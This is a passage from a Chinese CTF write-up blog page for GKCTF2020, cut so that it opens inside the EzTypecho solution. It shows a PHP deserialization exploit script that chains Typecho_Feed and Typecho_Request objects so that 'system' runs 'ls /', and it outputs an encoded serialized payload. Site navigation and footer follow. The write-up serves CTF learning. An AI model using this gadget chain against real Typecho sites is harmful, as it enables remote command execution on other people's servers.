class="token property">_params</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'screenName'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ls /'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token comment">//$this->_params['screenName'] = -1;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_filter</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">class</span> <span class="token class-name-definition class-name">Typecho_Feed</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">RSS2</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'RSS 2.0'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token comment">/** 定义 ATOM 1.0 类型 */</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">ATOM1</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'ATOM 1.0'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token comment">/** 定义 RSS 时间格式 */</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">DATE_RFC822</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'r'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token comment">/** 定义 ATOM 时间格式 */</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">DATE_W3CDTF</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'c'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token comment">/** 定义行结束符 */</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">const</span> <span class="token constant">EOL</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$_type</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">private</span> <span class="token variable">$_items</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    <span class="token keyword">public</span> <span class="token variable">$dateFormat</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_type</span> <span class="token operator">=</span> <span class="token keyword static-context">self</span><span class="token operator">::</span><span class="token constant">RSS2</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>        <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'link'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>        <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'2'</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="35"></td><td><pre>        <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'date'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1507720298</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="36"></td><td><pre>        <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'author'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="37"></td><td><pre>        <span class="token variable">$item</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'category'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Typecho_Request</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="38"></td><td><pre></pre></td></tr><tr><td data-num="39"></td><td><pre>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">_items</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$item</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="40"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="42"></td><td><pre></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token variable">$x</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Typecho_Feed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span></pre></td></tr><tr><td data-num="45"></td><td><pre>    <span class="token string single-quoted-string">'host'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'localhost'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="46"></td><td><pre>    <span class="token string single-quoted-string">'user'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'xxxxxx'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="47"></td><td><pre>    <span class="token string single-quoted-string">'charset'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'utf8'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="48"></td><td><pre>    <span class="token string single-quoted-string">'port'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'3306'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="49"></td><td><pre>    <span class="token string single-quoted-string">'database'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'typecho'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="50"></td><td><pre>    <span class="token string single-quoted-string">'adapter'</span> <span class="token operator">=></span> <span class="token variable">$x</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="51"></td><td><pre>    <span class="token string single-quoted-string">'prefix'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">'typecho_'</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr></table></figure><div class="tags"><a href="/tags/GKCTF2020/" rel="tag"><i class="ic i-tag"></i> GKCTF2020</a></div></div><footer><div class="meta"><span id="2023/04/05/GKCTF2020/" class="item leancloud_visitors" data-flag-title="GKCTF2020WP" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>Clown <i class="ic i-at"><em>@</em></i></li><li class="link"><strong>本文链接：</strong> <a href="https://blog.xcu.icu/2023/04/05/GKCTF2020/" title="GKCTF2020WP">https://blog.xcu.icu/2023/04/05/GKCTF2020/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/2023/04/01/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;36.jpg" title="RMI浅记"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> java安全</span><h3>RMI浅记</h3></a></div><div class="item right"><a href="/2023/04/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;note-1311335427.cos.ap-shanghai.myqcloud.com&#x2F;images&#x2F;86.jpg" title="java反序列化"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> java安全</span><h3>java反序列化</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E5%AD%A6%E7%94%9F%E7%9A%84%E5%AF%86%E7%A0%81%E9%A2%98"><span class="toc-number">2.1.</span> <span class="toc-text">小学生的密码题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B1%89%E5%AD%97%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">2.2.</span> <span class="toc-text">汉字的秘密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#babycrypto"><span class="toc-number">2.3.</span> <span class="toc-text">babycrypto</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#backdoor"><span class="toc-number">2.4.</span> <span class="toc-text">Backdoor</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pok%C3%A9mon"><span class="toc-number">3.1.</span> <span class="toc-text">Pokémon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#code-obfuscation"><span class="toc-number">3.2.</span> <span class="toc-text">code obfuscation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#harley-quinn"><span class="toc-number">3.3.</span> <span class="toc-text">Harley Quinn</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sail-a-boat-down-the-river"><span class="toc-number">3.4.</span> <span class="toc-text">Sail a boat down the river</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">4.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#checkin"><span class="toc-number">4.1.</span> <span class="toc-text">CheckIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%80%81%E5%85%AB%E5%B0%8F%E8%B6%85%E5%B8%82%E5%84%BF"><span class="toc-number">4.2.</span> <span class="toc-text">老八小超市儿</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cve%E7%89%88%E7%AD%BE%E5%88%B0"><span class="toc-number">4.3.</span> <span class="toc-text">cve 版签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez%E4%B8%89%E5%89%91%E5%AE%A2-eznode"><span class="toc-number">4.4.</span> <span class="toc-text">EZ 三剑客 - EzNode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez%E4%B8%89%E5%89%91%E5%AE%A2-ezweb"><span class="toc-number">4.5.</span> <span class="toc-text">EZ 三剑客 - EzWeb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez%E4%B8%89%E5%89%91%E5%AE%A2-eztypecho"><span class="toc-number">4.6.</span> <span class="toc-text">EZ 三剑客 - EzTypecho</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/2022/09/23/ISCC2022/" rel="bookmark" title="ISCC2022">ISCC2022</a></li><li class="active"><a href="/2023/04/05/GKCTF2020/" rel="bookmark" title="GKCTF2020WP">GKCTF2020WP</a></li><li><a href="/2023/06/01/ISCC2023/" rel="bookmark" title="ISCC2023">ISCC2023</a></li><li><a href="/2023/08/17/VNCTF2021/" rel="bookmark" title="VNCTF2021">VNCTF2021</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="Clown" data-src="/images/avatar.jpg"><p class="name" itemprop="name">Clown</p><div class="description" itemprop="description">一个妄想全栈web小废物</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">74</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">14</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">45</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Nsb3duLXE=" title="https:&#x2F;&#x2F;github.com&#x2F;clown-q"><i class="ic i-github"></i></span> <span class="exturl item email" data-url="bWFpbHRvOjI2NDIxMzczNjVAcXEuY29t" title="mailto:2642137365@qq.com"><i class="ic i-envelope"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2023/04/01/%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8(RMI)/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2023/04/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Web/" title="分类于 Web">Web</a></div><span><a href="/2023/03/20/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="主动信息收集">主动信息收集</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2023/03/11/yii%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="yii反序列化">yii反序列化</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E7%BD%91%E7%BB%9C%E6%9C%8D%E5%8A%A1%E5%BA%94%E7%94%A8/" title="分类于 网络服务应用">网络服务应用</a></div><span><a href="/2022/10/24/nat%E6%A8%A1%E5%BC%8Fip%E5%88%86%E9%85%8D/" title="nat模式+ip分配">nat模式+ip分配</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%9D%82%E8%AE%B0/" title="分类于 杂记">杂记</a></div><span><a href="/2023/08/15/Java%E7%BD%91%E7%BB%9C%E5%8C%96%E7%BC%96%E7%A8%8B/" title="Java网络化编程">Java网络化编程</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/JavaSE/" title="分类于 JavaSE">JavaSE</a></div><span><a href="/2023/07/31/JavaSE%EF%BC%88%E7%BA%BF%E7%A8%8B%EF%BC%89/" title="JavaSE（线程）">JavaSE（线程）</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vulnhub/" title="分类于 Vulnhub">Vulnhub</a></div><span><a href="/2023/07/20/Vegeta%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="记一台“misc”-Vegeta靶机打靶记录">记一台“misc”-Vegeta靶机打靶记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/java%E5%AE%89%E5%85%A8/" title="分类于 java安全">java安全</a></div><span><a href="/2023/04/14/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="java反序列化">java反序列化</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vulnhub/" title="分类于 Vulnhub">Vulnhub</a></div><span><a href="/2023/07/19/Hacker_Kid-v1.0.1%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/" title="Hacker_Kid-v1.0.1靶机打靶记录">Hacker_Kid-v1.0.1靶机打靶记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2022/11/01/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="CTFshow-web入门命令执行">CTFshow-web入门命令执行</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTFshow/" title="分类于 CTFshow">CTFshow</a></div><span><a href="/2023/03/05/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="CTFshow-web入门php反序列化">CTFshow-web入门php反序列化</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Clown @ ClownのBlog</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">713k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">10:48</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2023/04/05/GKCTF2020/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->